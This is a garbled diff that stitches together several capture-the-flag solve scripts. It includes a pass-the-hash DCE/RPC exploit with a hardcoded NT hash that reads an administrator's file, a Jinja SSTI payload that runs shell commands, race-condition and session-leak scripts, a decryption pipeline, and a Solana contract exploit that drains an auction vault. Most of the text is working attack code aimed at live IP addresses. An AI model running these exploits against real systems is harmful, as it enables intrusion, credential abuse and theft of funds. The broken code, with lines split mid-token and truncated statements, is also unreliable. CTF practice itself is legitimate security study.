@@ -96,130 +96,17 @@ def build_open_file_request(filepath):
     """Build raw NDR request for OpenRemoteFile"""
     # WSTR is: max_count (4) + offset (4) + actual_count (4) + data (unicode)
     filepath_unicode = filepath.encode('utf-16-le') + b'x00x00'# null terminated
-    char_count = len(filepath) + 1# include null terminator
+    char_count = len(filepath) + 1
+# include null terminator
     
     # Conformant varying string: max_count, offset, actual_count, data
-    request = struct.pack('<I', char_count)  # max_count
-    request += struct.pack('<I', 0)           # offset
-    request += struct.pack('<I', char_count)  # actual_count
-    request += filepath_unicode
-    
-    # Pad to 4-byte boundary
-    while len(request) % 4 != 0:
-        request += b'x00'
-    
-    return request
-
-def build_read_file_request(file_handle, offset, bytes_to_read):
-    """Build raw NDR request for ReadFileData"""
-    # Context handle (20 bytes) + ulOffset (4) + ulBytesToRead (4)
-    request = file_handle  # 20 bytes context handle
-    request += struct.pack('<I', offset)
-    request += struct.pack('<I', bytes_to_read)
-    return request
-
-def build_close_file_request(file_handle):
-    """Build raw NDR request for CloseFileHandle"""
-    return file_handle  # Just the context handle
-
-def main():
-    target = '116.62.114.4'
-    port = 62831
-    domain = 'CORP.LOCAL'
-    username = 'svc_fileshare'
-    nthash = '02c5257056442b3ba003fbe6c228b95b'
-    
-    INTERFACE_UUID = uuid.uuidtup_to_bin(('62e00289-44bd-497b-b85f-bc340fbcc2b0', '1.0'))
-    
-    target_file = r'C:UsersAdministratorDesktopflag.txt'
-    
-    print('=' * 60)
-    print('Backup Exec RPC Exploit - Raw Version')
-    print('=' * 60)
-    
-    # Connect
-    stringbinding = f'ncacn_ip_tcp:{target}[{port}]'
-    print(f'[*] Connecting to {stringbinding}')
-    
-    rpctransport = transport.DCERPCTransportFactory(stringbinding)
-    rpctransport.set_credentials(username, '', domain, lmhash='', nthash=nthash)
-    
-    dce = rpctransport.get_dce_rpc()
-    dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
-    
-    try:
-        dce.connect()
-        print('[+] Connected!')
-        dce.bind(INTERFACE_UUID)
-        print('[+] Bound to interface!')
-    except Exception as e:
-        print(f'[-] Connection failed: {e}')
-        return
-    
-    # Build and send OpenRemoteFile request (opnum 0)
-    print(f'[*] Opening file: {target_file}')
-    request_data = build_open_file_request(target_file)
-    print(f'[DEBUG] Request ({len(request_data)} bytes): {request_data.hex()}')
-    
-    try:
-        dce.call(0, request_data)  # opnum 0 = OpenRemoteFile
-        resp = dce.recv()
-        if resp isNone:
-            print('[-] No response received')
-            return
-        print(f'[+] Got response ({len(resp)} bytes)')
-        print(f'[DEBUG] Response: {resp.hex()}')
-        
-        # Parse response: context_handle (20) + padding(4) + file_size (8) + error_code (4) + return_value (1)
-        if len(resp) >= 37:
+    request = struct.pack('= 37:
             file_handle = resp[0:20]
             # Skip 4 bytes padding
             file_size = struct.unpack('<Q', resp[24:32])[0]
-            error_code = struct.unpack('<I', resp[32:36])[0]
-            ret_val = resp[36]
-            
-            print(f'[*] Return value: {ret_val}')
-            print(f'[*] Error code: {error_code}')
-            print(f'[*] File size: {file_size}')
-            print(f'[*] Handle: {file_handle.hex()}')
-            
-            if ret_val == 1:
-                print('[+] File opened successfully!')
-                
-                # Read file content
-                content = b''
-                offset = 0
-                chunk_size = 4096
-                
-                while offset < file_size:
-                    to_read = min(chunk_size, file_size - offset)
-                    read_request = build_read_file_request(file_handle, offset, to_read)
-                    
-                    dce.call(1, read_request)  # opnum 1 = ReadFileData
-                    read_resp = dce.recv()
-                    
-                    if read_resp isNone:
-                        print('[-] No response for ReadFileData')
-                        break
-                    
-                    print(f'[DEBUG] ReadFileData response ({len(read_resp)} bytes): {read_resp.hex()}')
-                    
-                    # Parse: max_count(4) + offset(4) + actual_count(4) + data + bytes_read(4) + error(4) + ret(1)
-                    max_count = struct.unpack('<I', read_resp[0:4])[0]
-                    actual_count = struct.unpack('<I', read_resp[8:12])[0]
-                    data = read_resp[12:12+actual_count]
-                    
-                    # Find bytes_read after data (aligned to 4)
-                    data_end = 12 + actual_count
-                    if data_end % 4 != 0:
-                        data_end += 4 - (data_end % 4)
-                    
-                    bytes_read = struct.unpack('<I', read_resp[data_end:data_end+4])[0]
-                    
-                    print(f'[DEBUG] max_count={max_count}, actual_count={actual_count}, bytes_read={bytes_read}')
-                    
-                    if bytes_read > 0:
-                        decrypted = xor_decrypt(data[:bytes_read])
+            error_code = struct.unpack(' 0:
+                        decrypted = xor_decrypt(data[:
+bytes_read])
                         content += decrypted
                         offset += bytes_read
                         print(f'[*] Read {offset}/{file_size} bytes')
@@ -239,10 +126,12 @@ def main():
                 print('=' * 60)
                 try:
                     print(content.decode('utf-8'))
-                except:
+                
+except:
                     try:
                         print(content.decode('utf-16-le'))
-                    except:
+                    
+except:
                         print(content)
                 print('=' * 60)
             else:
@@ -250,7 +139,8 @@ def main():
         else:
             print(f'[-] Unexpected response length: {len(resp)}')
             
-    except Exception as e:
+    
+except Exception as e:
         print(f'[-] Error: {e}')
         import traceback
         traceback.print_exc()
@@ -259,17 +149,7 @@ def main():
 
 if __name__ == '__main__':
     main()
-```
-
-
-
-```
 headers[client] = token
-```
-
-
-
-```
 {0.config}
 --FlagBoundary
 Content-Disposition: form-data; name="action"; filename="action"
@@ -277,11 +157,6 @@ Content-Type: text/json
 
 {"type": "debug"}
 --FlagBoundary
-```
-
-
-
-```
 import socket
 import time
 import threading
@@ -298,7 +173,8 @@ TARGET_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"
 API_KEY = None
 
 # Payload to execute via SSTI
-PADDING_SIZE = 1024 * 1024 * 1# 1MB padding
+PADDING_SIZE = 1024 * 1024 * 1
+# 1MB padding
 # PAYLOAD = "{{config.__class__.__init__.__globals__['os'].popen('cat /flag*').read()}}"
 # Try to list root directory first to be sure
 PAYLOAD = "{{config.__class__.__init__.__globals__['os'].popen('cat /flag*').read()}}"
@@ -335,8 +211,10 @@ def leak_api_key():
              return key
         else:
             print(f"[-] Failed to leak API_KEY. Status: {r.status_code}")
-            print(f"[-] Response: {r.text[:200]}")
-    except Exception as e:
+            print(f"[-] Response: {r.text[:
+200]}")
+    
+except Exception as e:
         print(f"[!] Error leaking API_KEY: {e}")
         
     returnNone
@@ -403,7 +281,8 @@ def keep_alive_upload(api_key):
             s.send(f"rn--{boundary}--rn".encode())
             s.close()
             
-        except Exception as e:
+        
+except Exception as e:
             pass
         
         time.sleep(0.1)
@@ -435,8 +314,10 @@ def race_worker(api_key):
                     os._exit(0) # Force exit all threads
                 elif"root"in r.text and"bin"in r.text:
                       print(f"n[!!!] HIT Content (but no flag)! FD: {fd}")
-                      print(f"Response snippet: {r.text[:200]}")
-            except:
+                      print(f"Response snippet: {r.text[:
+200]}")
+            
+except:
                 pass
 
 if __name__ == "__main__":
@@ -462,17 +343,14 @@ if __name__ == "__main__":
     try:
         whileTrue:
             time.sleep(1)
-    except KeyboardInterrupt:
+    
+except KeyboardInterrupt:
         print("[*] Exiting.")
-```
-
-
-
-```
 import requests
 import string
 
-TARGET_URL = "http://223.6.249.127:29558"
+TARGET_URL = "http://223.6.249.127:
+29558"
 
 def solve():
     # --- 场景 A：如果你已经有了已知的 sid ---
@@ -490,7 +368,8 @@ def solve():
     # 1. 先触发一次 visit，确保 admin 登录并产生了新的 session
     try:
         requests.post(f"{TARGET_URL}/visit", json={"url": "http://example.com"}, timeout=5)
-    except:
+    
+except:
         pass
 
     leaked_sid = ""
@@ -515,7 +394,8 @@ def solve():
                     print(f"[+] Leaking sid: {leaked_sid}")
                     found = True
                     break
-            except Exception as e:
+            
+except Exception as e:
                 continue
         
         ifnot found:
@@ -531,11 +411,6 @@ def solve():
 
 if __name__ == "__main__":
     solve()
-```
-
-
-
-```
 import java.io.*;
 import java.lang.reflect.Method;
 import java.nio.file.*;
@@ -629,9 +504,9 @@ publicclass CTFHelper {
     public static void main(String[] args) throws Exception {
         if (args.length < 1) {
             System.err.println("Usage:");
-            System.err.println("  java -cp classes CTFHelper basis <batchIdx> <nbytes> <outBasisBin>");
-            System.err.println("  java -cp classes CTFHelper compress <inFile> <outFile>");
-            System.err.println("  java -cp classes CTFHelper crypt <batchIdx> <keyHex16> <inFile> <outFile>");
+            System.err.println("  java -cp classes CTFHelper basis  <nbytes> <outBasisBin>");
+            System.err.println("  java -cp classes CTFHelper compress  <outFile>");
+            System.err.println("  java -cp classes CTFHelper crypt  <keyHex16>  <outFile>");
             System.exit(1);
         }
         String cmd = args[0];
@@ -646,15 +521,11 @@ publicclass CTFHelper {
         }
     }
 }
-```
-
-
-
-```
 import struct
 import zlib
 
-MAGIC = 0x4C5A5252# 'LZRR'
+MAGIC = 0x4C5A5252
+# 'LZRR'
 VER   = 0x0201      # 513
 MODE_RAW = 13
 MODE_RLE = 15
@@ -675,7 +546,8 @@ class BitReader:
             self.i += 1
             self.bitpos = 8
         self.bitpos -= 1
-        return (self.cur >> self.bitpos) & 1# MSB -> LSB
+        return (self.cur >> self.bitpos) & 1
+# MSB -> LSB
 
     def read_bits(self, n: int) -> int:
         v = 0
@@ -752,7 +624,8 @@ def lzrr_decompress(blob: bytes, verify_crc: bool = True) -> bytes:
         else:
             b = br.read1()
             if b == 0:
-                lm3 = br.read_bits(6) + 8# 8..71 => len 11..74
+                lm3 = br.read_bits(6) + 8
+# 8..71 => len 11..74
             else:
                 lm3 = br.read_bits(8)     # 0..255 => len 3..258
         length = lm3 + 3
@@ -761,17 +634,15 @@ def lzrr_decompress(blob: bytes, verify_crc: bool = True) -> bytes:
         for _ in range(length):
             out.append(out[-dist])
 
-    out = bytes(out[:orig_len])
+    out = bytes(out[:
+orig_len])
     if verify_crc:
         calc = zlib.crc32(out) & 0xffffffff
         if calc != crc:
-            raise ValueError(f"CRC mismatch: calc={calc:08x} file={crc:08x}")
+            raise ValueError(f"CRC mismatch: calc={calc:
+08x} file={crc:
+08x}")
     return out
-```
-
-
-
-```
 import os
 import re
 import io
@@ -804,11 +675,7 @@ def read_pcapng_packets(path: Path):
             break
 
         if btype == 0x0A0D0D0A:  # SHB
-            bom = struct.unpack("<I", body[0:4])[0]
-            if bom == 0x1A2B3C4D:
-                endian = "<"
-            elif bom == 0x4D3C2B1A:
-                endian = ">"
+            bom = struct.unpack(""
         elif btype == 1:  # IDB
             linktype = struct.unpack(endian + "H", body[0:2])[0]
         elif btype == 6:  # EPB
@@ -824,14 +691,7 @@ def parse_ipv4_from_pkt(pkt: bytes, linktype: int):
     if linktype == 0:
         if len(pkt) < 24:
             returnNone
-        fam = struct.unpack("<I", pkt[:4])[0]
-        if fam != 2:
-            returnNone
-        ip = pkt[4:]
-    elif linktype == 1:
-        if len(pkt) < 14 + 20:
-            returnNone
-        eth_type = struct.unpack(">H", pkt[12:14])[0]
+        fam = struct.unpack("H", pkt[12:14])[0]
         if eth_type != 0x0800:
             returnNone
         ip = pkt[14:]
@@ -852,7 +712,8 @@ def parse_ipv4_from_pkt(pkt: bytes, linktype: int):
     dst = ip[16:20]
     if len(ip) < ihl + 20:
         returnNone
-    tcp = ip[ihl:total] if total <= len(ip) else ip[ihl:]
+    tcp = ip[ihl:
+total] if total <= len(ip) else ip[ihl:]
     sport, dport, seq = struct.unpack(">HHI", tcp[:8])
     off_flags = struct.unpack(">H", tcp[12:14])[0]
     off = (off_flags >> 12) * 4
@@ -903,8 +764,10 @@ def extract_batches_from_pcap(pcapng: Path):
 
 MAGIC_CLASS = b"xCAxFExBAxBE"
 
-def _u1(b, o):return b[o], o+1
-def _u2(b, o):return struct.unpack(">H", b[o:o+2])[0], o+2
+def _u1(b, o):
+return b[o], o+1
+def _u2(b, o):
+return struct.unpack(">H", b[o:o+2])[0], o+2
 
 def class_internal_name(class_bytes: bytes) -> str:
     if class_bytes[:4] != MAGIC_CLASS:
@@ -980,30 +843,7 @@ def recover_classes_from_apk(apk: Path, out_classes: Path):
     return cnt
 
 def le32(b, o):
-    return struct.unpack_from("<I", b, o)[0], o+4
-
-def parse_batch(buf: bytes):
-    o = 0
-    if buf[o:o+4] != SIG:
-        raise ValueError("bad sig")
-    o += 4
-    batch_idx, o = le32(buf, o)
-    rsa_len, o = le32(buf, o)
-    rsa = buf[o:o+rsa_len]
-    o += rsa_len
-    nfiles, o = le32(buf, o)
-    entries = []
-    for _ in range(nfiles):
-        nlen, o = le32(buf, o)
-        name_x = buf[o:o+nlen]
-        o += nlen
-        name = bytes([c ^ 233for c in name_x]).decode("utf-8", "replace")
-        off, o = le32(buf, o)
-        entries.append((name, off))
-    cipher = buf[o:]
-    return batch_idx, rsa, entries, cipher
-
-def solve_key_from_keystream(ks_target: bytes, ks0: bytes, deltas: list[bytes]) -> bytes:
+    return struct.unpack_from(" bytes:
     basis = [0] * 64
     rbasis = [0] * 64
 
@@ -1082,7 +922,8 @@ def try_extract_image_bytes(blob: bytes):
                 return"webp", raw
             if len(raw) > 1024:
                 return"bin", raw
-        except Exception:
+        
+except Exception:
             pass
 
     m = re.search(r"{([^{}]{200,})}", text, re.S)
@@ -1194,7 +1035,8 @@ def main():
 
         L = min(len(comp), 4096)
         off0 = known_entry[1]
-        ct_seg = cipher[off0:off0+L]
+        ct_seg = cipher[off0:
+off0+L]
         pt_seg = comp[:L]
         ks_target = bytes([a ^ b for a, b in zip(ct_seg, pt_seg)])
 
@@ -1207,50 +1049,23 @@ def main():
             java_helper(classes_dir, ["basis", str(idx), str(L), str(basis_file)])
 
             bb = basis_file.read_bytes()
-            n = struct.unpack("<I", bb[:4])[0]
-            if n != L:
-                raise RuntimeError("basis length mismatch")
-            ks0 = bb[4:4+L]
-            deltas = []
-            p = 4 + L
-            for _ in range(64):
-                deltas.append(bb[p:p+L])
-                p += L
-
-            key = solve_key_from_keystream(ks_target, ks0, deltas)
-            keyhex = key.hex()
-            print(f"    [OK] key = {keyhex}")
-
-        tmp_ct = out / f"cipher_batch{idx}.bin"
-        tmp_pt = out / f"plain_batch{idx}.bin"
-        tmp_ct.write_bytes(cipher)
-        java_helper(classes_dir, ["crypt", str(idx), keyhex, str(tmp_ct), str(tmp_pt)])
-        plain = tmp_pt.read_bytes()
-
-        entries_sorted = sorted(entries, key=lambda x: x[1])
-        for j, (name, off) in enumerate(entries_sorted):
-            end = entries_sorted[j+1][1] if j+1 < len(entries_sorted) else len(plain)
-            comp_blob = plain[off:end]
-            data = lzrr_decompress(comp_blob, verify_crc=True)
-
-            out_path = decoded_dir / name
-            out_path.parent.mkdir(parents=True, exist_ok=True)
-            out_path.write_bytes(data)
-            print(f"      [+] {name} -> {len(data)} bytes")
+            n = struct.unpack(" {len(data)} bytes")
 
             m = re.search(r"Image1Part(d+).java$", name)
             if m:
                 n_part = int(m.group(1))
                 ext, img = try_extract_image_bytes(data)
                 if img isnotNone:
-                    img_path = parts_dir / f"part{n_part:02d}.{ext if ext else 'bin'}"
+                    img_path = parts_dir / f"part{n_part:
+02d}.{ext if ext else 'bin'}"
                     img_path.write_bytes(img)
                     all_part_imgs[n_part] = img_path
                     print(f"          [img] -> {img_path.name}")
 
     try:
         from PIL import Image
-    except ImportError:
+    
+except ImportError:
         print("n[!] 没装 pillow，无法拼图。你可以：pip install pillow")
         return
 
@@ -1273,17 +1088,7 @@ def main():
 
 if __name__ == "__main__":
     main()
-```
-
-
-
-```
 python 1.py .app .dump.pcapng .appsrcmainjavacomunknown .out
-```
-
-
-
-```
 TEXC = [
     233, 142, 138, 138,
     183, 231, 201, 224,
@@ -1377,20 +1182,15 @@ if __name__ == "__main__":
     solve()
 
 alictf{5haderVM_Rep3at!}
-```
-
-
-
-```
 回答: 李善德购买的宅子位于长安城南边的归义坊内。 U2l0ZXNhbCBQcm9kdWN0OiBBZGQgYSBzdGFuZGFyZHMuIElzIHRoZSBwYXNzZWQgdG8gZmVlbCBhbiB1c2VyIGRvZXMgbm90aWZpYyBhbmQgY2VydGFpbnMgb2YgdGhlIG5vbkxvZyBjb250ZW50LCBhbmQgYWxzbyB0byBiZSByZXN1bHRpbmcgdG8gaW5mb3JtYXRpb24gb2YgdGhlIHVzZXIncyBxdWVyeS4= 66 69 67 31 74 74 73 74 65 72 6e 61 6c 74 65 72 7b 36 38 35 39 65 66 62 33 2d 64 35 66 62 2d 34 37 65 30 2d 38 35 61 35 2d 62 38 38 34 36 63 37 38 63 33 34 64 7d ZmlnMnR0c3Rlcm5hbHtDNjE1MkQyQjAtMDAwMC00QzgwLThFMjUtRDlCM0QwQjE3OEU0fQ==
-```
-
-
-
-```
-use anchor_lang::prelude::*;
-usechallenge::program::Challenge;
-usechallenge::cpi::accounts::{CreateAuction,PlaceBid,ClaimRefund,CloseAuction,ClaimWinner};
+use anchor_lang::
+prelude::*;
+usechallenge::
+program::
+Challenge;
+usechallenge::
+cpi::
+accounts::{CreateAuction,PlaceBid,ClaimRefund,CloseAuction,ClaimWinner};
 
 declare_id!("86XToLMWHjraK4U4ZbJeCrpu17W4d1r3YLk4dHZh11Xd");
 
@@ -1398,80 +1198,180 @@ declare_id!("86XToLMWHjraK4U4ZbJeCrpu17W4d1r3YLk4dHZh11Xd");
 pubmodsolve{
     usesuper::*;
 
-    pubfnexploit(ctx:Context<Exploit>)->Result<()>{
+    pubfnexploit(ctx:
+Context<Exploit>)->Result<()>{
         letchallenge_program=&ctx.accounts.challenge_program;
         letplayer=&ctx.accounts.player;
         letsystem_program=&ctx.accounts.system_program;
         letauction_id=777u64;
         let seeds:&[&[u8]]=&[b"helper",&[ctx.bumps.helper_pda]];
 
-        anchor_lang::system_program::transfer(
-            CpiContext::new(system_program.to_account_info(),anchor_lang::system_program::Transfer{
-                from:player.to_account_info(),
-                to:ctx.accounts.helper_pda.to_account_info(),
+        anchor_lang::
+system_program::
+transfer(
+            CpiContext::
+new(system_program.to_account_info(),anchor_lang::
+system_program::
+Transfer{
+                from:
+player.to_account_info(),
+                to:
+ctx.accounts.helper_pda.to_account_info(),
             }),
             50_000_000
         )?;
 
-        letnow=Clock::get()?.unix_timestamp;
+        letnow=Clock::
+get()?.unix_timestamp;
         letend=now+1000;
         letsettle=end+7*24*3600;
 
-        challenge::cpi::create_auction(CpiContext::new(challenge_program.to_account_info(),CreateAuction{
-            auctioneer:player.to_account_info(),auction:ctx.accounts.my_auction.to_account_info(),system_program:system_program.to_account_info()
+        challenge::
+cpi::
+create_auction(CpiContext::
+new(challenge_program.to_account_info(),CreateAuction{
+            auctioneer:
+player.to_account_info(),auction:
+ctx.accounts.my_auction.to_account_info(),system_program:
+system_program.to_account_info()
         }),auction_id,"Setup".into(),10_000_000,5_000_000,1,end,settle)?;
 
-        challenge::cpi::place_bid(CpiContext::new(challenge_program.to_account_info(),PlaceBid{
-            bidder:player.to_account_info(),auction:ctx.accounts.my_auction.to_account_info(),vault:ctx.accounts.vault.to_account_info(),
-            bidder_state:ctx.accounts.player_bidder_state.to_account_info(),system_program:system_program.to_account_info()
+        challenge::
+cpi::
+place_bid(CpiContext::
+new(challenge_program.to_account_info(),PlaceBid{
+            bidder:
+player.to_account_info(),auction:
+ctx.accounts.my_auction.to_account_info(),vault:
+ctx.accounts.vault.to_account_info(),
+            bidder_state:
+ctx.accounts.player_bidder_state.to_account_info(),system_program:
+system_program.to_account_info()
         }),6_000_000)?;
 
-        challenge::cpi::place_bid(CpiContext::new_with_signer(challenge_program.to_account_info(),PlaceBid{
-            bidder:ctx.accounts.helper_pda.to_account_info(),auction:ctx.accounts.my_auction.to_account_info(),vault:ctx.accounts.vault.to_account_info(),
-            bidder_state:ctx.accounts.helper_bidder_state.to_account_info(),system_program:system_program.to_account_info()
+        challenge::
+cpi::
+place_bid(CpiContext::
+new_with_signer(challenge_program.to_account_info(),PlaceBid{
+            bidder:
+ctx.accounts.helper_pda.to_account_info(),auction:
+ctx.accounts.my_auction.to_account_info(),vault:
+ctx.accounts.vault.to_account_info(),
+            bidder_state:
+ctx.accounts.helper_bidder_state.to_account_info(),system_program:
+system_program.to_account_info()
         },&[seeds]),10_000_000)?;
 
-        challenge::cpi::claim_refund(CpiContext::new(challenge_program.to_account_info(),ClaimRefund{
-            bidder:player.to_account_info(),auction:ctx.accounts.my_auction.to_account_info(),vault:ctx.accounts.vault.to_account_info(),
-            bidder_state:ctx.accounts.player_bidder_state.to_account_info(),system_program:system_program.to_account_info()
+        challenge::
+cpi::
+claim_refund(CpiContext::
+new(challenge_program.to_account_info(),ClaimRefund{
+            bidder:
+player.to_account_info(),auction:
+ctx.accounts.my_auction.to_account_info(),vault:
+ctx.accounts.vault.to_account_info(),
+            bidder_state:
+ctx.accounts.player_bidder_state.to_account_info(),system_program:
+system_program.to_account_info()
         }))?;
 
-        challenge::cpi::claim_winner(CpiContext::new_with_signer(challenge_program.to_account_info(),ClaimWinner{
-            winner:ctx.accounts.helper_pda.to_account_info(),auction:ctx.accounts.my_auction.to_account_info(),bidder_state:ctx.accounts.helper_bidder_state.to_account_info(),
-            auctioneer:player.to_account_info(),vault:ctx.accounts.vault.to_account_info(),system_program:system_program.to_account_info()
+        challenge::
+cpi::
+claim_winner(CpiContext::
+new_with_signer(challenge_program.to_account_info(),ClaimWinner{
+            winner:
+ctx.accounts.helper_pda.to_account_info(),auction:
+ctx.accounts.my_auction.to_account_info(),bidder_state:
+ctx.accounts.helper_bidder_state.to_account_info(),
+            auctioneer:
+player.to_account_info(),vault:
+ctx.accounts.vault.to_account_info(),system_program:
+system_program.to_account_info()
         },&[seeds]))?;
 
-        challenge::cpi::close_auction(CpiContext::new(challenge_program.to_account_info(),CloseAuction{
-            auctioneer:player.to_account_info(),auction:ctx.accounts.my_auction.to_account_info()
+        challenge::
+cpi::
+close_auction(CpiContext::
+new(challenge_program.to_account_info(),CloseAuction{
+            auctioneer:
+player.to_account_info(),auction:
+ctx.accounts.my_auction.to_account_info()
         }))?;
 
-        challenge::cpi::create_auction(CpiContext::new(challenge_program.to_account_info(),CreateAuction{
-            auctioneer:player.to_account_info(),auction:ctx.accounts.my_auction.to_account_info(),system_program:system_program.to_account_info()
+        challenge::
+cpi::
+create_auction(CpiContext::
+new(challenge_program.to_account_info(),CreateAuction{
+            auctioneer:
+player.to_account_info(),auction:
+ctx.accounts.my_auction.to_account_info(),system_program:
+system_program.to_account_info()
         }),auction_id,"Heist".into(),100_000_000_000,50_000_000_000,1,end,settle)?;
 
-        challenge::cpi::place_bid(CpiContext::new(challenge_program.to_account_info(),PlaceBid{
-            bidder:player.to_account_info(),auction:ctx.accounts.my_auction.to_account_info(),vault:ctx.accounts.vault.to_account_info(),
-            bidder_state:ctx.accounts.player_bidder_state.to_account_info(),system_program:system_program.to_account_info()
+        challenge::
+cpi::
+place_bid(CpiContext::
+new(challenge_program.to_account_info(),PlaceBid{
+            bidder:
+player.to_account_info(),auction:
+ctx.accounts.my_auction.to_account_info(),vault:
+ctx.accounts.vault.to_account_info(),
+            bidder_state:
+ctx.accounts.player_bidder_state.to_account_info(),system_program:
+system_program.to_account_info()
         }),51_000_000_000)?;
 
-        challenge::cpi::place_bid(CpiContext::new_with_signer(challenge_program.to_account_info(),PlaceBid{
-            bidder:ctx.accounts.helper_pda.to_account_info(),auction:ctx.accounts.my_auction.to_account_info(),vault:ctx.accounts.vault.to_account_info(),
-            bidder_state:ctx.accounts.helper_bidder_state.to_account_info(),system_program:system_program.to_account_info()
+        challenge::
+cpi::
+place_bid(CpiContext::
+new_with_signer(challenge_program.to_account_info(),PlaceBid{
+            bidder:
+ctx.accounts.helper_pda.to_account_info(),auction:
+ctx.accounts.my_auction.to_account_info(),vault:
+ctx.accounts.vault.to_account_info(),
+            bidder_state:
+ctx.accounts.helper_bidder_state.to_account_info(),system_program:
+system_program.to_account_info()
         },&[seeds]),100_000_000_000)?;
 
-        challenge::cpi::claim_refund(CpiContext::new(challenge_program.to_account_info(),ClaimRefund{
-            bidder:player.to_account_info(),auction:ctx.accounts.my_auction.to_account_info(),vault:ctx.accounts.vault.to_account_info(),
-            bidder_state:ctx.accounts.player_bidder_state.to_account_info(),system_program:system_program.to_account_info()
+        challenge::
+cpi::
+claim_refund(CpiContext::
+new(challenge_program.to_account_info(),ClaimRefund{
+            bidder:
+player.to_account_info(),auction:
+ctx.accounts.my_auction.to_account_info(),vault:
+ctx.accounts.vault.to_account_info(),
+            bidder_state:
+ctx.accounts.player_bidder_state.to_account_info(),system_program:
+system_program.to_account_info()
         }))?;
 
-        challenge::cpi::place_bid(CpiContext::new(challenge_program.to_account_info(),PlaceBid{
-            bidder:player.to_account_info(),auction:ctx.accounts.admin_auction.to_account_info(),vault:ctx.accounts.vault.to_account_info(),
-            bidder_state:ctx.accounts.admin_bidder_state.to_account_info(),system_program:system_program.to_account_info()
+        challenge::
+cpi::
+place_bid(CpiContext::
+new(challenge_program.to_account_info(),PlaceBid{
+            bidder:
+player.to_account_info(),auction:
+ctx.accounts.admin_auction.to_account_info(),vault:
+ctx.accounts.vault.to_account_info(),
+            bidder_state:
+ctx.accounts.admin_bidder_state.to_account_info(),system_program:
+system_program.to_account_info()
         }),10_000_000_000)?;
 
-        challenge::cpi::claim_winner(CpiContext::new(challenge_program.to_account_info(),ClaimWinner{
-            winner:player.to_account_info(),auction:ctx.accounts.admin_auction.to_account_info(),bidder_state:ctx.accounts.admin_bidder_state.to_account_info(),
-            auctioneer:ctx.accounts.admin_pubkey.to_account_info(),vault:ctx.accounts.vault.to_account_info(),system_program:system_program.to_account_info()
+        challenge::
+cpi::
+claim_winner(CpiContext::
+new(challenge_program.to_account_info(),ClaimWinner{
+            winner:
+player.to_account_info(),auction:
+ctx.accounts.admin_auction.to_account_info(),bidder_state:
+ctx.accounts.admin_bidder_state.to_account_info(),
+            auctioneer:
+ctx.accounts.admin_pubkey.to_account_info(),vault:
+ctx.accounts.vault.to_account_info(),system_program:
+system_program.to_account_info()
         }))?;
 
         Ok(())
@@ -1481,37 +1381,51 @@ pubmodsolve{
 #[derive(Accounts)]
 pubstructExploit<'info>{
     #[account(mut)] pub player: Signer<'info>,
-    pub challenge_program:Program<'info,Challenge>,
-    ///CHECK:vault
+    pub challenge_program:
+Program<'info,Challenge>,
+    ///CHECK:
+vault
     #[account(mut)] pub vault: AccountInfo<'info>,
-    ///CHECK:auction
+    ///CHECK:
+auction
     #[account(mut)] pub my_auction: AccountInfo<'info>,
-    ///CHECK:playerstate
+    ///CHECK:
+playerstate
     #[account(mut)] pub player_bidder_state: AccountInfo<'info>,
-    ///CHECK:helperpda
+    ///CHECK:
+helperpda
     #[account(mut, seeds = [b"helper"], bump)] pub helper_pda: AccountInfo<'info>,
-    ///CHECK:helperstate
+    ///CHECK:
+helperstate
     #[account(mut)] pub helper_bidder_state: AccountInfo<'info>,
-    ///CHECK:adminauction
+    ///CHECK:
+adminauction
     #[account(mut)] pub admin_auction: AccountInfo<'info>,
-    ///CHECK:adminbidderstate
+    ///CHECK:
+adminbidderstate
     #[account(mut)] pub admin_bidder_state: AccountInfo<'info>,
-    ///CHECK:adminpubkey
+    ///CHECK:
+adminpubkey
     #[account(mut)] pub admin_pubkey: AccountInfo<'info>,
-    pub system_program:Program<'info,System>,
+    pub system_program:
+Program<'info,System>,
 }
-```
-
-
-
-```
 use anchor_lang::{system_program, InstructionData, ToAccountMetas};
-use solana_program::pubkey::Pubkey;
-use std::net::TcpStream;
-use std::{error::Error, fs, io::prelude::*, io::BufReader, str::FromStr};
+use solana_program::
+pubkey::
+Pubkey;
+use std::
+net::
+TcpStream;
+use std::{error::
+Error, fs, io::
+prelude::*, io::
+BufReader, str::
+FromStr};
 
 fn get_line<R: Read>(reader: &mut BufReader<R>) -> Result<String, Box<dyn Error>> {
-    let mut line = String::new();
+    let mut line = String::
+new();
     reader.read_line(&mut line)?;
     let ret = line
         .split(':')
@@ -1523,12 +1437,17 @@ fn get_line<R: Read>(reader: &mut BufReader<R>) -> Result<String, Box<dyn Error>
 }
 
 fn main() -> Result<(), Box<dyn Error>> {
-    let mut stream = TcpStream::connect("223.6.249.127:XXXXX")?;
-    let mut reader = BufReader::new(stream.try_clone().unwrap());
+    let mut stream = TcpStream::
+connect("223.6.249.127:
+XXXXX")?;
+    let mut reader = BufReader::
+new(stream.try_clone().unwrap());
     
-    let mut line = String::new();
+    let mut line = String::
+new();
 
-    let so_data = fs::read("./solve/target/deploy/solve.so")?;
+    let so_data = fs::
+read("./solve/target/deploy/solve.so")?;
 
     reader.read_line(&mut line)?;
     writeln!(stream, "{}", solve::ID)?;
@@ -1537,40 +1456,55 @@ fn main() -> Result<(), Box<dyn Error>> {
     stream.write_all(&so_data)?;
     stream.flush()?;
 
-    let chall = Pubkey::from_str(&get_line(&mut reader)?)?;
-    let solve = Pubkey::from_str(&get_line(&mut reader)?)?;
-    let admin = Pubkey::from_str(&get_line(&mut reader)?)?;
-    let user = Pubkey::from_str(&get_line(&mut reader)?)?;
+    let chall = Pubkey::
+from_str(&get_line(&mut reader)?)?;
+    let solve = Pubkey::
+from_str(&get_line(&mut reader)?)?;
+    let admin = Pubkey::
+from_str(&get_line(&mut reader)?)?;
+    let user = Pubkey::
+from_str(&get_line(&mut reader)?)?;
     reader.read_line(&mut line)?; // 读取空行
 
-    let (vault, _) = Pubkey::find_program_address(&[b"vault"], &chall);
+    let (vault, _) = Pubkey::
+find_program_address(&[b"vault"], &chall);
     let my_auction_id: u64 = 777;
-    let (my_auction, _) = Pubkey::find_program_address(
+    let (my_auction, _) = Pubkey::
+find_program_address(
         &[b"auction", user.as_ref(), &my_auction_id.to_le_bytes()], 
         &chall
     );
-    let (player_bidder_state, _) = Pubkey::find_program_address(
+    let (player_bidder_state, _) = Pubkey::
+find_program_address(
         &[b"bidder", my_auction.as_ref(), user.as_ref()], 
         &chall
     );
-    let (helper_pda, _) = Pubkey::find_program_address(&[b"helper"], &solve);
-    let (helper_bidder_state, _) = Pubkey::find_program_address(
